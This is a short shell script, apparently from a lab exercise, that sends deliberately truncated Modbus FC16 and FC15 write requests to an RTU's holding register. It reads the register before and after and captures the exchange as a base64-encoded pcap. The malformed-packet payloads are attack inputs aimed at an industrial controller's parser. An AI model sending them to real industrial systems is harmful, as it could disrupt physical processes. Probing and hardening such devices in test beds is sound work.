# kali: truncated FC16 (byte count 2, no data bytes) to rtu-1 holding register 40000, with reads around it; pcap
cd /tmp/miniccc/files; M=$(ls -t *mb.py | head -1); P=/tmp/ev-fc16-$$.pcap
tcpdump -i any -U -w $P 'tcp port 502 and host 10.1.1.101' 2>/tmp/tcpdump-$$.err & TP=$!; sleep 2
date -u +%FT%TZ
echo "--- read 40000 (FC03) before"; for i in 1 2 3; do python3 $M raw 10.1.1.101 039c400001; done
echo "--- truncated FC16: addr 40000 qty 1 bytecount 2, NO data (PDU 109c40000102)"; python3 $M raw 10.1.1.101 109c40000102
echo "--- truncated FC16 qty 128 bytecount 0 (uint8 wrap) PDU 109c40008000"; python3 $M raw 10.1.1.101 109c40008000
echo "--- truncated FC15: addr 0 qty 1 bytecount 1, NO data (PDU 0f0000000101)"; python3 $M raw 10.1.1.101 0f0000000101
echo "--- read 40000 after"; for i in 1 2 3; do python3 $M raw 10.1.1.101 039c400001; done
sleep 1; kill $TP; sleep 1
echo "--- control (outside the capture): well-formed bench"; python3 $M bench 10.1.1.101 3 40000 200
 echo "PCAP $(stat -c %s $P) bytes"; echo "PCAP-B64-BEGIN"; base64 -w0 $P; echo; echo "PCAP-B64-END"
